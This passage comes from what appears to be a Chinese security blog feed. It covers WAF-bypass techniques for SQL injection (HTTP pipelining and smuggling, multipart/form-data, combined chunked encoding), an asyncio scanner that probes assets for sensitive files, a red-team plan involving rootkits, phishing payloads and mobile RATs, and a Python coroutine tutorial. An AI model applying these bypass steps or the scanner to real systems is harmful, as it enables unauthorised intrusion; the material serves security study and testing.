0中，pipeline是默认关闭的，除非客户端在请求的header中使用<code>Connection:Keep-Alive</code>。在http1.1中，默认所有的连接都是持久连接。利用pipeline的特性将payload分成两个包，前一个放sql注入的payload，后一个放正常的数据包，有些waf会只检查最后一个数据包从而造成绕过。其实这个技术的本质就是HTTP请求走私。</p><p><img src="/image-20220405115834684.png" alt="Pipeline绕过"></p><p>下面说一下构造pipeline请求的方式：</p><ol><li>在burp中取消勾选“Update Content-Length”</li><li>复制一份数据包，直接跟在第一个数据包的后面</li><li>将第一个数据包的<code>Connection</code>改为<code>Keep-Alive</code></li><li>将第二个数据包的post body改为正常的数据</li><li>最后手动计算一下第二个包的数据长度，设置在Content-Length中，比如我的第二个包的数据<code>uname=1&amp;passwd=1&amp;submit=Submit</code>长度为30，Content-Length就设置为30</li><li>点击Send发送数据包即可</li></ol><p><img src="/image-20220405120150144.png" alt="取消勾选“Update Content-Length”"></p><h3 id="multipart-form-data绕过"><a href="#multipart-form-data绕过" class="headerlink" title="multipart&#x2F;form-data绕过"></a>multipart&#x2F;form-data绕过</h3><p>这种方式也称“协议未覆盖绕过”</p><p>http的Content-Type提交表单支持三种类型：</p><ul><li><p>application&#x2F;x-www-form-urlencoded 编码模式 这也是最常见的form表单提交的格式</p></li><li><p>multipart&#x2F;form-data 这种格式多用于文件上传的file控件</p></li><li><p>text&#x2F;plain 文本模式</p></li></ul><p>Content-Type的作用就是告诉服务器提交上来的表单是以什么格式编码的，以便于服务器解码。由于multipart&#x2F;form-data多用于对上传的文件进行编码，所以有些waf不会检查编码后的文件内容，如果我们以这种形式提交post数据，则可以绕过waf。</p><p><img src="/image-20220405145549950.png" alt="multipart/form-data绕过"></p><h3 id="组合技绕waf"><a href="#组合技绕waf" class="headerlink" title="组合技绕waf"></a>组合技绕waf</h3><p>通常绕过waf需要将上述的技巧进行组合，比如分块传输+multipart&#x2F;form-data绕过，先进行form-data编码，再进行分块传输编码。</p><p><img src="/image-20220405150006982.png" alt="组合技绕waf"></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.anquanke.com/post/id/177044">对过WAF的一些认知</a></p><p><a href="https://xz.aliyun.com/t/8490">MySQL绕过小结</a></p><p><a href="https://www.anquanke.com/post/id/169738">利用分块传输吊打所有WAF</a></p><p><a href="https://www.freebuf.com/news/193659.html">在HTTP协议层面绕过WAF</a></p><p><a href="https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/">Java反序列化数据绕WAF之延时分块传输</a></p><p><a href="https://zhuanlan.zhihu.com/p/351375005">解密协议层的攻击——HTTP请求走私</a></p><p><a href="https://trustfoundry.net/bypassing-wafs-with-json-unicode-escape-sequences/">Bypassing WAFs with JSON Unicode Escape Sequences</a></p><p><a href="https://xz.aliyun.com/t/368">我的WafBypass之道（SQL注入篇）</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python协程扫描器实现</title>
    <link href="/2021/04/20/python%E5%8D%8F%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%99%A8%E5%AE%9E%E7%8E%B0/"/>
    <url>/2021/04/20/python%E5%8D%8F%E7%A8%8B%E6%89%AB%E6%8F%8F%E5%99%A8%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="时隔一个月，我又回来了"><a href="#时隔一个月，我又回来了" class="headerlink" title="时隔一个月，我又回来了"></a>时隔一个月，我又回来了</h2><p>最近hw，懂得都懂。闲的时候用python的协程实现了一款高速扫描器，用来扫描资产的敏感文件。当然扫描别的啥都行，看你怎么改。这个扫描器只是自己写的一个爬虫框架的一款插件，代码仅供参考学习。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> aiohttp<br><br>LOG_PRINT_FLAG = <span class="hljs-number">0</span> <span class="hljs-comment"># 是否在控制台打印扫描日志</span><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-params">session, url</span>):<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate, br&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;keep-alive&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36&quot;</span>,<br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.head(url, headers=headers, timeout=<span class="hljs-number">30</span>) <span class="hljs-keyword">as</span> res:<br>            <span class="hljs-keyword">return</span> [url, res.status]<br>    <span class="hljs-keyword">except</span> aiohttp.client_exceptions.ClientConnectorError:<br>        <span class="hljs-comment"># print(&#x27;访问失败：&#123;&#125;&#x27;.format(url))</span><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> asyncio.exceptions.TimeoutError:<br>        <span class="hljs-comment"># print(&#x27;访问超时：&#123;&#125;&#x27;.format(url))</span><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_alive</span>(<span class="hljs-params">urls</span>):<br>    <span class="hljs-comment"># 检测目标主机是否存活,只返回响应结果为200的目标</span><br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        tasks = [asyncio.ensure_future(fetch(session, url)) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls]<br>        results = <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br>    <span class="hljs-keyword">return</span> [i[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, results))] <span class="hljs-comment">#过滤掉None</span><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">urls, callback=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        tasks = [asyncio.ensure_future(fetch(session, url)) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls]<br>        <span class="hljs-keyword">if</span> callback:<br>            <span class="hljs-keyword">for</span> task <span class="hljs-keyword">in</span> tasks:<br>                task.add_done_callback(callback)<br>        results = <span class="hljs-keyword">await</span> asyncio.gather(*tasks)<br>    <span class="hljs-keyword">return</span> [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(<span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, results))]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logger_print</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># 在控制台打印日志</span><br>    <span class="hljs-keyword">if</span> LOG_PRINT_FLAG:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在扫描：&#x27;</span>,url.result())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logger_write</span>(<span class="hljs-params">log_dir, log_content</span>):<br>    <span class="hljs-comment"># 写入日志</span><br>    log_filename = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time()))+<span class="hljs-string">&#x27;.log&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.join(log_dir, log_filename), <span class="hljs-string">&#x27;w+&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(log_content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_urls_li</span>(<span class="hljs-params">csv_path</span>):<br>    <span class="hljs-comment"># 从csv中获取目标url的list</span><br>    urls_li = []<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(csv_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> csv:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> csv.readlines()[<span class="hljs-number">1</span>:]:<br>            url = line.split(<span class="hljs-string">&#x27;;&#x27;</span>)[<span class="hljs-number">0</span>]<br>            urls_li.append(url)<br>        <span class="hljs-keyword">return</span> urls_li<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dics_li</span>(<span class="hljs-params">dic_path</span>):<br>    <span class="hljs-comment"># 获取字典</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(dic_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> dic:<br>        <span class="hljs-keyword">return</span> [x.strip(<span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> dic.readlines()]<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">csv_path, dic_path, log_dir</span>):<br>    <span class="hljs-comment"># 分为三个模块，先检测存活，再批量扫描，最后写入日志</span><br>    <span class="hljs-comment"># 检测存活</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在检测目标IP是否存活...&#x27;</span>)<br>    urls = []<br>    urls_li = get_urls_li(csv_path)<br>    dics_li = get_dics_li(dic_path)<br>    urls_alive = <span class="hljs-keyword">await</span> check_alive(urls_li)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;共发现&#123;&#125;个存活IP&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(urls_alive)))<br><br>    <span class="hljs-comment"># 扫描</span><br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls_alive:<br>        <span class="hljs-keyword">for</span> dic <span class="hljs-keyword">in</span> dics_li:<br>            urls.append(os.path.join(url, dic))<br>    start = time.time()<br>    urls_scan = <span class="hljs-keyword">await</span> scan(urls, logger_print)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;扫描完成，共耗时: %.2f 秒&quot;</span> % (time.time() - start))<br><br>    <span class="hljs-comment"># 记录日志</span><br>    log_content = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls_scan:<br>        log_content += <span class="hljs-string">&#x27;&#123;0&#125; &#123;1&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(url[<span class="hljs-number">0</span>], url[<span class="hljs-number">1</span>])<br>    logger_write(log_dir,log_content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">csv_path, dic_path, log_dir</span>):<br>    <span class="hljs-comment"># 程序入口</span><br>    asyncio.run(main(csv_path, dic_path, log_dir))<br><br><br>run(<span class="hljs-string">&#x27;./result/fofa.csv&#x27;</span>,dic_path=<span class="hljs-string">&#x27;./dic/bak.txt&#x27;</span>,log_dir=<span class="hljs-string">&#x27;./log/&#x27;</span>)<br></code></pre></td></tr></table></figure><p>速度的话还不错，近2000个请求用了8秒多，差不多每秒处理250个请求，要是再加上多进程速度还能翻几倍，但我懒得加了，以后有时间再看</p><p><img src="/./%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20210420170937.png" alt="性能"></p><h2 id="想"><a href="#想" class="headerlink" title="想"></a>想</h2><p>刚开始写的那一版有bug，扫描的时候会漏掉很多url，找了好几天的bug没想出为什么，可能我代码写的有问题。后来看了这篇文章<a href="http://python.iswbm.com/en/latest/c10/c10_10.html">《【并发编程】深入异步IO框架：asyncio 中篇》</a>，重新写了一遍扫描器，思路清晰了很多，建议把上中下都看一下，写的很不错。u1s1，比廖雪峰的清晰 :)</p><p>其实还看到一篇在湾湾的哥们写的文章，真的看的我笑到不行惹，让你也笑一下<a href="https://lanf0n.medium.com/aiohttp-%E7%9A%84-connection-pool-168cc4952dc8">aiohttp 的 connection pool</a>，国内看不了medium，要挂梯子哦</p><p>bye~</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RedTeam随笔</title>
    <link href="/2021/03/23/RedTeam%E9%9A%8F%E7%AC%94/"/>
    <url>/2021/03/23/RedTeam%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<h3 id="红队随笔"><a href="#红队随笔" class="headerlink" title="红队随笔"></a>红队随笔</h3><h4 id="理想中的红队架构"><a href="#理想中的红队架构" class="headerlink" title="理想中的红队架构"></a>理想中的红队架构</h4><ul><li>渗透实战小组：专注于红队攻击，内部可以按照个人特长，进行任务细分</li><li>信息系统支持与工具研发小组：红队服务器运维，红队匿名工具提供，红队工具研发</li><li>情报与信息收集小组：对于目标的关键情报和信息进行收集</li><li>二进制支持小组：恶意程序的分析，以及后门技术，rootkit技术，免杀对抗技术的研究与支持</li><li>安全研究与代码审计小组：安全研究和代码审计小组</li></ul><p>有条件的话，再加入下面两个部门</p><ul><li>移动安全小组：android cc和ios cc，移动端程序逆向、加解密，后门分析</li><li>报告、文档工作与对接小组：将红队主力从繁重的报告与对接任务中解放出来</li></ul><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>背景：拿到一个app，需要对app后面的系统进行redteaming</p><p>任务流水线：app分析——信息收集——红队渗透——后门驻留——终端钓鱼——移动终端攻击——取证与监控——报告与总结输出</p><p>任务分解：</p><ul><li>app分析：<strong>移动安全部门</strong>主要分析app中的api地址，以及其他的信息泄露，如果app代码存在加密和混淆，还需要进一步的分析</li><li>信息收集：<strong>情报与信息收集小组</strong>对于该app中包好的域名、ip进行扫描，通过子域名、同站、c段等信息扩展目标资产攻击面，并收集目标站群暴露的信息，以及可能存在的问题。此处，使用到了<strong>信息系统支持与工具研发小组</strong>负责研发的工具，以及运维的匿名服务器</li><li>红队渗透：<strong>渗透实战小组</strong>的红队工程师接入，以<strong>情报与信息小组</strong>提供的信息为切入点，尝试攻击目标站群。倘若获取到目标源码，则交由<strong>安全研究与代码分析小组</strong>进行审计</li><li>后门驻留：在红队渗透获取到相关的权限后，<strong>渗透实战小组</strong>的红队工程师开始使用<strong>信息系统支持与工具研发小组</strong>与<strong>二进制支持小组</strong>合作开发的rootkit植入目标机，并启动相应的持久化后门</li><li>终端钓鱼：<strong>渗透实战小组</strong>的红队工程师将<strong>信息系统支持与工具研发小组</strong>提供的cc载荷以钓鱼的方式植入到特定的位置，等待触发。该cc载荷的免杀由<strong>二进制支持小组</strong>维护</li><li>移动终端攻击：<strong>渗透实战小组</strong>的工程师尝试利用wifi和usb连接，将<strong>移动安全小组</strong>提供的移动端RAT植入到目标移动终端中</li><li>取证与监控：<strong>渗透实战小组</strong>的红队工程师利用在（移动）终端中植入的后门对（移动）终端进行取证和长时间的监控。监控中使用的工具由<strong>移动安全小组</strong>、<strong>信息系统支持与工具研发小组</strong>研发，工具的基础原理由<strong>二进制支持小组</strong>、<strong>安全研究与代码审计小组</strong>研究得到</li><li>报告与总结输出：输出报告和总结由<strong>渗透实战小组</strong>提供粗略版本，由<strong>报告文档与对接小组</strong>负责整理</li></ul>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习——异步IO</title>
    <link href="/2021/02/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5IO/"/>
    <url>/2021/02/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%BC%82%E6%AD%A5IO/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学完了python的多线程，终于满心欢喜地去分析lijiejie的扫描器了，结果发现他还用到了协程&#x2F;(ㄒoㄒ)&#x2F;~~，没办法，再回来学习一下协程的知识。</p><p>学过计组我们都知道，CPU的速度远高于IO设备的速度。每次执行一个任务，CPU执行一部分后需要等待IO设备执行完，CPU再去执行。这样严重拖慢了CPU的效率。这种运行方式就叫同步IO。那什么是异步IO呢？就是CPU再完成了自己一部分工作后，把IO的任务分配给IO设备后就不再过问，继续执行手头的活，等IO设备的任务执行完后，告诉CPU一声，CPU再接下去执行。这样的好处是CPU的运行不会受IO拖累，一直保持高速执行，从而提高整体执行效率。</p><p>在“发出IO请求”到收到“IO完成”的这段时间里，同步IO模型下，主线程只能挂起，但异步IO模型下，主线程并没有休息，而是在消息循环中继续处理其他消息。这样，在异步IO模型下，一个线程就可以同时处理多个IO请求，并且没有切换线程的操作。对于大多数IO密集型的应用程序，使用异步IO将大大提升系统的多任务处理能力。</p><h2 id="generator与yield"><a href="#generator与yield" class="headerlink" title="generator与yield"></a>generator与yield</h2><p>好吧，在讲生成器之前，先讲一下列表生成式（ps：你咋不从盘古开天辟地开始讲…）</p><p>在python中可以很方便地产生一个list，如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">l = [x * x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br></code></pre></td></tr></table></figure><p>他将返回一个包含0-9的二次幂的list，但是如果我们要包含100万个元素呢？这将会占用很大的内存。如果我们仅仅需要访问前面几个元素，那后面的内存空间就白白浪费了。</p><p>如果列表中的元素可以按某种算法推算出来，那我们就不必在用之前将整个list计算出来，而可以在一边循环的时候一边再计算出具体的值。这种机制叫做生成器。还是上面这个例子，产生一个生成器最简单的方式就是将[]变成()即可将list变为生成器。如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">g = (x * x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))<br></code></pre></td></tr></table></figure><p>获取其中的值的方式也很简单，一种是单步获取，通过不断next()函数来计算下一步的值；另一种是通过for循环来获取，和for循环一个list没什么两样。</p><p>生成器除了next()方法，还有send(value)和close()方法，send(value)方法会将当前yield表达式的值设置为value。close()方法就是关闭当前生成器。</p><p>上面说的是产生一个生成器的列表形式，如果要写成函数的形式呢？生成器有另一种定义方式，如果一个函数中包含<code>yield</code>关键字，那么这个函数就不是普通函数了，而是一个生成器。</p><p>简单地说，yield可以等同于return，yield就是 return 返回一个值，并且记住这个返回的位置，下次迭代就从这个位置后开始。</p><p>注意：用for循环一个生成器函数，会拿不到函数return的值。如果想要拿到返回值，必须捕获<code>StopIteration</code>错误，返回值包含在<code>StopIteration</code>的<code>value</code>中，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">g = generator(<span class="hljs-number">6</span>)<br><span class="hljs-keyword">while</span> Ture:<br>    <span class="hljs-keyword">try</span>:<br>        x = <span class="hljs-built_in">next</span>(g)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;g:&#x27;</span>,x)<br>    <span class="hljs-keyword">except</span> StopIteration <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Generator return value&#x27;</span>, e.value)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>在多进程和多线程中，我们说它们始终会有数量上限，无论是进程还是线程都不可能无上限并发，达到这个上限后CPU忙于切换，无暇处理真正的任务，导致效率变慢。进程的切换，一切进程需要反复进入内核，置换掉一大堆状态，会带来大量内存的加载。线程的切换，虽然是在同一个进程里，共享一个地址空间，不用麻烦地切换内存，刷新TLB，只需要把寄存器刷新一遍，大大减小了进程切换带来的资源开销。但这些操作依然是由系统来调度，如果我们可以由用户态来实现整个程序的逻辑流，就避免了系统来进行任务调度，由用户态来实现的任务调度机制就是协程。是在一个线程之内实现任务调度。</p><p>和多线程比，协程最大的优势就是极高的执行效率。因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显。</p><p>第二大优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不加锁，只需要判断状态就好了，所以执行效率比多线程高很多。</p><p>协程是一个线程执行，那怎么利用多核CPU呢？最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。</p><p>来看一个协程的生产者-消费者例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">consumer</span>():<br>    r = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-keyword">yield</span> r<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> n:<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[CONSUMER] Consuming %s...&#x27;</span> % n)<br>        r = <span class="hljs-string">&#x27;200 OK&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">produce</span>(<span class="hljs-params">c</span>):<br>    c.send(<span class="hljs-literal">None</span>)<br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> n &lt; <span class="hljs-number">5</span>:<br>        n = n + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[PRODUCER] Producing %s...&#x27;</span> % n)<br>        r = c.send(n)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[PRODUCER] Consumer return: %s&#x27;</span> % r)<br>    c.close()<br><br>c = consumer()<br>produce(c)<br></code></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">[PRODUCER] Producing <span class="hljs-number">1.</span>..<br>[CONSUMER] Consuming <span class="hljs-number">1.</span>..<br>[PRODUCER] Consumer <span class="hljs-keyword">return</span>: <span class="hljs-number">200</span> OK<br>[PRODUCER] Producing <span class="hljs-number">2.</span>..<br>[CONSUMER] Consuming <span class="hljs-number">2.</span>..<br>[PRODUCER] Consumer <span class="hljs-keyword">return</span>: <span class="hljs-number">200</span> OK<br>[PRODUCER] Producing <span class="hljs-number">3.</span>..<br>[CONSUMER] Consuming <span class="hljs-number">3.</span>..<br>[PRODUCER] Consumer <span class="hljs-keyword">return</span>: <span class="hljs-number">200</span> OK<br>[PRODUCER] Producing <span class="hljs-number">4.</span>..<br>[CONSUMER] Consuming <span class="hljs-number">4.</span>..<br>[PRODUCER] Consumer <span class="hljs-keyword">return</span>: <span class="hljs-number">200</span> OK<br>[PRODUCER] Producing <span class="hljs-number">5.</span>..<br>[CONSUMER] Consuming <span class="hljs-number">5.</span>..<br>[PRODUCER] Consumer <span class="hljs-keyword">return</span>: <span class="hljs-number">200</span> OK<br></code></pre></td></tr></table></figure><p>这段程序定义了两个函数，一个生产者，一个消费者，先产生一个消费者，作为参数传给生产者。这个生产者函数还有yield关键字，所以是一个生成器。首先执行生产者函数，调用<code>c.send(None)</code>调用了consumer()，这里我们用pdb来debug一下这个程序，看一下整个执行过程</p><p><img src="/image-20210219184249790.png" alt="执行过程1"></p><p>call consumer()，走consumer()的程序，进入while循环后，yield返回r的值，n也被赋值为None，由于满足下面的if条件，程序被return到produce()</p><p><img src="/image-20210219184510391.png" alt="执行过程2"></p><p>在produce()中进入while循环，对n进行了加1，打印一串字符串后继续send，调用consumer()，此时传入的n为1</p><p><img src="/image-20210219185234317.png" alt="image-20210219185234317"></p><p>在回到consumer()后，注意是从上一次yield的地方开始执行，而不是从头执行，此时n为1，不满足if条件，所以不会被return，print后r被赋值为200ok，再执行到yield后返回到produce()并传回响应。接下来就是循环出来结束程序。建议自己去调试一下感受一下整个过程。 </p><p><img src="/image-20210219185901228.png" alt="image-20210219185901228"></p><p>整个流程无锁，由一个线程执行，<code>produce</code>和<code>consumer</code>协作完成任务，所以称为“协程”，而非线程的抢占式多任务。</p><h2 id="asyncio"><a href="#asyncio" class="headerlink" title="asyncio"></a>asyncio</h2><p>async和await的前生是基于生成器的协程。原本中间还想写一下用原始的生成器和yield from，但没必要了。从python3.10版本开始就会废弃这种模式。所以现在直接使用async和await就可以了，还简化了流程。注意，async和await在3.5及以后才可以使用。</p><h3 id="async与await"><a href="#async与await" class="headerlink" title="async与await"></a>async与await</h3><p>async 定义一个协程，await 用来挂起阻塞方法的执行。先来看一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">say_after</span>(<span class="hljs-params">delay, what</span>):<br>    <span class="hljs-keyword">await</span> asyncio.sleep(delay)<br>    <span class="hljs-built_in">print</span>(what)<br>    <br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span 